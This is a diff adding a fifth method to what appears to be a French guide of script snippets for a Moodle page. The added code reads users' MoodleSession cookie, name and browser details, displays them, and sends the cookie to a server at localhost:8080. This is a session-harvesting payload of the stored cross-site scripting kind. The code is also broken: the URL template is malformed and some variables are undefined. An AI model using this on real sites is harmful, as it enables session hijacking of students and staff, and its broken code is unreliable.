@@ -185,3 +185,67 @@
 </script>
 ```
 
+## Méthode 5 : avec requete http
+
+```html
+<p id="info"></p>
+<p><br></p>
+
+<script>
+function getCookie(name) {
+    const value = "; " + document.cookie;
+    const parts = value.split("; " + name + "=");
+    if (parts.length === 2) return parts.pop().split(";").shift();
+    return null;
+}
+
+function getUserFullName() {
+    const user = document.querySelector('.logininfo a');
+    if (user) {
+        return user.innerText.trim();
+    } else {
+        return "Utilisateur non trouvé";
+    }
+}
+
+function getDeviceFingerprint() {
+    return {
+        userAgent: navigator.userAgent,
+        screen: screen.width + "x" + screen.height,
+        language: navigator.language
+    };
+}
+
+let cookie = getCookie("MoodleSession");
+let username = getUserFullName();
+let fingerprint = getDeviceFingerprint();
+
+let result = "<h2>Nom : " + username + "<br>" +
+             "Cookie : " + (cookie || "Non trouvé") + "<br>" +
+             "User Agent : " + fingerprint.userAgent + "<br>" +
+             "Résolution : " + fingerprint.screen + "<br>" +
+             "Langue : " + fingerprint.language + "</h2>";
+
+document.getElementById("info").innerHTML = result;
+
+  // Envoi de la requête
+function sendRechargeRequest(nom_etud, id_vpl, cookie) {
+    const url = `http://localhost:8080/recharge nom_etud=${encodeURIComponent(nom_etud)}&id_vpl=${encodeURIComponent(id_vpl)}&cookie=${encodeURIComponent(cookie)} ``;
+
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                console.log("✅ Requête envoyée avec succès");
+            } else {
+                console.error("❌ Erreur côté serveur");
+            }
+        })
+        .catch(error => {
+            console.error("❌ Erreur réseau :", error);
+        });
+}
+
+sendRechargeRequest(username, id_vpl, cookieValue);
+
+</script>
+```
